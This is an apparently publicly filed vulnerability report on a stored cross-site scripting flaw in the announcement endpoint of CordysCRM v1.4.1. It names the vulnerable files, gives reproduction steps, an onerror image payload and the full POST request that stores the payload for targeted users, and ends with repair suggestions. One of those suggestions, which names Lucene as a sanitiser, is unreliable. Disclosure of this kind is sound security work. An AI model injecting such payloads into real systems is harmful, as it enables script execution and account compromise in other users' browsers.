## Vulnerability Description

The `AnnouncementController` component in CordysCRM v1.4.1 contains a **stored cross-site scripting (XSS)** vulnerability. This vulnerability stems from the `addAnnouncement()` method's failure to adequately validate or encode the `content` parameter when processing new announcement requests. A remote attacker could use the `/announcement/add` interface to submit announcement content containing malicious JavaScript code. This announcement could be viewed by any user, allowing an attack on any user on the system. When a designated user (such as an administrator or regular employee) views the announcement, the malicious script will execute in their browser environment.


## Vulnerability Analysis

The vulnerability's entry point class file is: src/main/java/cn/cordys/crm/system/controller/AnnouncementController.java


The `addAnnouncement()` method does not perform any XSS filtering; it proceeds directly to the logic layer for processing.


<img width="1438" height="663" alt="Pasted image 20260513113508" src="https://github.com/user-attachments/assets/6d81708c-07e7-4362-9d7f-440b161adcf6" />


Logic layer class file: src/main/java/cn/cordys/crm/system/service/AnnouncementService.java

The logic layer did not perform any XSS filtering on the incoming announcement content. Line 103 calls a database operation to insert data into the database. A stored XSS vulnerability exists.

<img width="1444" height="869" alt="Pasted image 20260513114140" src="https://github.com/user-attachments/assets/a3bc72f2-05f8-4f49-81bd-cdd3cbb22835" />


## Vulnerability Reproduction


Log in with an account that has permission to modify and create announcements, and enter the announcement creation interface.

<img width="1920" height="927" alt="Pasted image 20260513114517" src="https://github.com/user-attachments/assets/a0907177-6098-416e-8c26-291768d2e8ca" />


The content created is as follows.

The payload is as follows: `<img src=x onerror='alert(1)'>`

The time must be set to a valid time; otherwise, the attack will fail and the announcement will not load.

<img width="1237" height="845" alt="Pasted image 20260513114605" src="https://github.com/user-attachments/assets/5d49d9c6-a29b-4458-9ab3-e354d5ecbfbe" />




When selecting the recipient, you can choose to attack any user on the system. Here, you can select any user on the system or specify a user; select the "test" user.


<img width="1237" height="845" alt="Pasted image 20260513114605" src="https://github.com/user-attachments/assets/0f3c7397-8e2a-4344-9c98-bc8255170d6f" />


Click to preview

<img width="1179" height="787" alt="Pasted image 20260513114947" src="https://github.com/user-attachments/assets/a2e1f20e-0f6b-4bc0-bb91-951823e3dde0" />


It can be observed that the payload is triggered.

<img width="1818" height="840" alt="Pasted image 20260513115008" src="https://github.com/user-attachments/assets/1a3d45e3-58df-4395-a3d5-c9e3ba932a29" />


Clicking "OK" will create an announcement and trigger the following request data packet:
```http
POST /announcement/add HTTP/1.1
Host: localhost:8081
Content-Length: 907
X-AUTH-TOKEN: 5b596f77-5942-4eb7-94a4-6b3fefbc2f29
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN
sec-ch-ua: "Chromium";v="143", "Not A(Brand";v="24"
CSRF-TOKEN: CYkmuI1mKOp91CuBqbqVQ1GvBQNqI891/DPRjSiSWZO0COyOcRSal7HBV+vWJ/ZqoEzUK8bbPdrjmbINXi3X1fNWh1egX5HnkwhPZj+rPA==
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
Origin: http://localhost:8081
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8081/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"id":"","subject":"XSS_test","content":"<img src=x onerror='alert(1)'>","startTime":1778642754481,"endTime":1778728854481,"url":"aa","organizationId":"100001","deptIds":["666664823709696"],"userIds":["621670746316800","627237023932416"],"range":[1778642754481,1778728854481],"renameUrl":"","ownerIds":[{"label":"test","value":"621670746316800","id":"621670746316800","name":"test","parentId":"101895390147641344","organizationId":null,"nodeType":"USER","enabled":true,"commander":false,"sort":1,"level":1},{"label":"aa","value":"627237023932416","id":"627237023932416","name":"aa","parentId":"101895390147641344","organizationId":null,"nodeType":"USER","enabled":true,"commander":false,"sort":2,"level":1},{"label":"11","value":"666664823709696","id":"666664823709696","name":"11","parentId":"101895390147641344","organizationId":null,"nodeType":"ORG","enabled":true,"commander":false,"sort":3,"level":1}]}
```

<img width="1920" height="909" alt="Pasted image 20260513115145" src="https://github.com/user-attachments/assets/a476b473-8ab6-4b64-9848-652b55b39ee1" />



Open another browser, log in as the test user, and you can see that the payload is effective, indicating a stored XSS vulnerability. Reproduction complete.

<img width="1920" height="995" alt="Pasted image 20260513115242" src="https://github.com/user-attachments/assets/3591f434-fc32-40bc-a924-6c512a6c4ed4" />


## Repair suggestions

Input Filtering: Use a security library (such as Java's AntiSamy or Lucene) in the backend to whitelist submitted HTML content, removing dangerous tags and attributes such as `script` and `onmouseover`.

Output Escaping: Ensure variables are HTML entity encoded when rendering announcement content in the frontend template.

Content Security Policy (CSP): Configure an appropriate CSP policy to restrict the execution of inline scripts.
